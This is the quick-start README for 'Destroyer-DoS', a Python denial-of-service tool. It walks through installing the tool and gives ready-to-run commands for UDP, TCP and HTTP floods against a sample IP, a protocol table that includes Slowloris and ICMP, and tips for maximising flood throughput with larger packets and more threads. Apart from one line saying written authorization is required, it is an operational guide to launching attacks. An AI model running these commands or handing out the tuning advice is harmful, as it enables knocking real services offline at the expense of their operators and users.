# Quick Start Guide

Get started with Destroyer-DoS in 5 minutes.

## Prerequisites

- Python 3.8+
- pip package manager
- Administrator/root access (for some protocols)
- Written authorization to test target systems

## Installation

### Step 1: Clone Repository

```bash
git clone https://github.com/Destroyer-official/Destroyer-DoS.git
cd Destroyer-DoS
```

### Step 2: Create Virtual Environment

**Windows:**

```cmd
python -m venv venv
venv\Scripts\activate
```

**Linux/macOS:**

```bash
python3 -m venv venv
source venv/bin/activate
```

### Step 3: Install Dependencies

```bash
pip install -r requirements.txt
```

### Step 4: Verify Installation

```bash
python ddos.py --status
```

Expected output:

```
=== Destroyer-DoS System Status ===
Safety Systems:    Available
AI/ML Systems:     Available
Analytics:         Available
...
```

## Basic Usage

### Command Structure

```
python ddos.py -i TARGET -p PORT -t PROTOCOL [OPTIONS]
```

### Simple Examples

```bash
# UDP flood (30 seconds)
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 30

# TCP flood
python ddos.py -i 192.168.1.100 -p 80 -t TCP -d 30

# HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -d 30
```

### Stop an Attack

Press `Ctrl+C` to stop immediately.

## Protocol Reference

| Protocol | Command      | Notes                |
| -------- | ------------ | -------------------- |
| UDP      | `-t UDP`     | Highest throughput   |
| TCP      | `-t TCP`     | Connection-based     |
| HTTP     | `-t HTTP`    | Requires web server  |
| HTTPS    | `-t HTTPS`   | Requires SSL server  |
| DNS      | `-t DNS`     | DNS queries          |
| ICMP     | `-t ICMP`    | Requires admin       |
| SLOW     | `-t SLOW`    | Slowloris attack     |
| QUANTUM  | `-t QUANTUM` | High-entropy packets |

## Performance Tips

For maximum throughput:

```bash
# Use larger packets and more threads
python ddos.py -i TARGET -p 80 -t UDP -s 8192 -x 32 -d 60
```

Recommended settings:

- Packet size: 8192 bytes for max throughput
- Threads: 32-64 for best performance
- Protocol: UDP for highest speed

## Troubleshooting

### "Permission denied"

Run as Administrator (Windows) or with sudo (Linux/macOS).

### Low performance

- Increase threads: `-x 32`
- Use larger packets: `-s 8192`
- Close other applications

### Module not found

Ensure virtual environment is activated and run:

```bash
pip install -r requirements.txt
```

## Next Steps

- [Full Usage Guide](USAGE.md)
- [API Reference](API_REFERENCE.md)
- [Performance Results](PERFORMANCE_RESULTS.md)
